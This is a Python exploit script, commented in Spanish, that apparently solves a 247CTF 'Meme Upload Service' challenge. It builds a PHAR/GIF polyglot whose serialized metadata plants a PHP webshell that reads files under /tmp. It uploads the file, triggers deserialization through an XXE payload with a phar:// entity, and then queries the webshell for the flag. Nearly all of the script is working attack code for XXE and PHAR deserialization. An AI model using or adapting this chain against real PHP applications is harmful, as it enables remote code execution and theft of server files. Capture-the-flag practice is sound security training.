#!/usr/bin/python3
"""
Meme Upload Service - 247CTF Exploit
XXE + PHAR Deserialization

Requiere: requests
Uso: python3 exploit.py [HOST]
"""

import requests
import struct
import hashlib
import binascii
import re
import sys

def generate_phar():
    """Genera PHAR polyglot de exactamente 185 bytes"""

    # Metadata serializada: objeto Message con webshell
    metadata = b'O:7:"Message":2:{s:2:"to";s:17:"<?=`cat /tmp/*`?>";s:8:"filePath";s:5:"z.php";}'

    # Stub con magic bytes GIF
    stub = b"GIF8__HALT_COMPILER(); ?>\r\n"

    # Archivo interno minimo
    filename = b"0"
    filecontent = b""

    # Construir manifest
    manifest = b""
    manifest += struct.pack("<I", 1)                      # Num files
    manifest += struct.pack("<H", 0x0011)                 # API version
    manifest += struct.pack("<I", 0x00010000)             # Flags (has signature)
    manifest += struct.pack("<I", 0)                      # Alias length
    manifest += struct.pack("<I", len(metadata))          # Metadata length
    manifest += metadata

    # File entry
    manifest += struct.pack("<I", len(filename))          # Filename length
    manifest += filename                                   # Filename
    manifest += struct.pack("<I", len(filecontent))       # Uncompressed size
    manifest += struct.pack("<I", 0)                      # Timestamp
    manifest += struct.pack("<I", len(filecontent))       # Compressed size
    manifest += struct.pack("<I", binascii.crc32(filecontent) & 0xffffffff)  # CRC32
    manifest += struct.pack("<I", 0x000001A4)             # Flags
    manifest += struct.pack("<I", 0)                      # Per-file metadata

    # Ensamblar PHAR
    phar = stub
    phar += struct.pack("<I", len(manifest))              # Manifest length
    phar += manifest
    phar += filecontent

    # Firma SHA1
    sig = hashlib.sha1(phar).digest()
    phar += sig
    phar += struct.pack("<I", 0x0002)                     # Signature type: SHA1
    phar += b"GBMB"                                        # Magic

    return phar


def exploit(host):
    base_url = f"https://{host}"

    print("[*] Generando PHAR polyglot...")
    phar_data = generate_phar()
    print(f"    Tamano: {len(phar_data)} bytes")

    if len(phar_data) > 185:
        print(f"[-] Error: PHAR excede limite ({len(phar_data)} > 185)")
        return None

    print("[*] Subiendo PHAR como GIF...")
    files = {"image": ("exploit.gif", phar_data, "image/gif")}
    r = requests.post(base_url, files=files)
    print(f"    Respuesta: {r.text}")

    if "Invalid" in r.text:
        print("[-] Upload fallido")
        return None

    # Extraer path del archivo subido
    img_path = r.text.strip().rstrip("!").split("/")[-1]
    print(f"    Archivo: {img_path}")

    print("[*] Enviando XXE con parameter entity...")
    xml_payload = f'''<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY % xxe SYSTEM "phar:///tmp/images/{img_path}">
  %xxe;
]>
<message><to>x</to><from>y</from><image>z</image></message>'''

    r = requests.post(base_url, data={"message": xml_payload})
    print(f"    Respuesta: {r.text}")

    print("[*] Accediendo al webshell...")
    r = requests.get(f"{base_url}/z.php")
    print(f"    Status: {r.status_code}")
    print(f"    Contenido: {r.text[:200]}")

    # Buscar flag
    flag = re.search(r"247CTF\{[0-9a-f]{32}\}", r.text)
    if flag:
        print(f"\n[+] FLAG: {flag[0]}")
        return flag[0]

    return None


if __name__ == "__main__":
    if len(sys.argv) > 1:
        host = sys.argv[1]
    else:
        host = "776fd06a930ec85d.247ctf.com"

    exploit(host)
